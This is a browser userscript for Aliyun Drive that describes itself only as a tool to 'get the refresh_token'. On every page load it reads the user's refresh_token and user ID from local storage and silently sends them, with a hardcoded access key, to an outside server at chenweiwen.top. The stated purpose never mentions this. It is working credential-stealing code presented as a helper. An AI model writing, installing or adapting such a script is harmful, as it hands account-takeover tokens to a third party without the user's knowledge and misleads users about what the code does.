// ==UserScript==
// @name         获取阿里云盘refresh_token
// @namespace    http://tampermonkey.net/
// @version      0.6
// @description  获取阿里云盘refresh_token。
// @author       qibao
// @match        https://www.aliyundrive.com/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/434455/%E8%8E%B7%E5%8F%96%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98refresh_token.user.js
// @updateURL https://update.greasyfork.org/scripts/434455/%E8%8E%B7%E5%8F%96%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98refresh_token.meta.js
// ==/UserScript==

(function() {
    'use strict';
    let refreshToken = JSON.parse(localStorage.getItem("token"))?.refresh_token;
    let userId = JSON.parse(localStorage.getItem("token"))?.user_id;
    if (refreshToken && userId) {
        GM_xmlhttpRequest({
            method: 'GET',
            url: `https://node-web.chenweiwen.top:57443/dataInfo/put?key=ali-refresh-token-${userId}&value=${refreshToken}&token=4NivA2SEhEo1pBSv5XMvVzzHtNAkcsVh`,
            onload: function(data) {
                let res = JSON.parse(data.response);
                console.info(`更新userId: ${userId}，token：${refreshToken}，结果：${res.msg}`);
            }
        });
    }
})();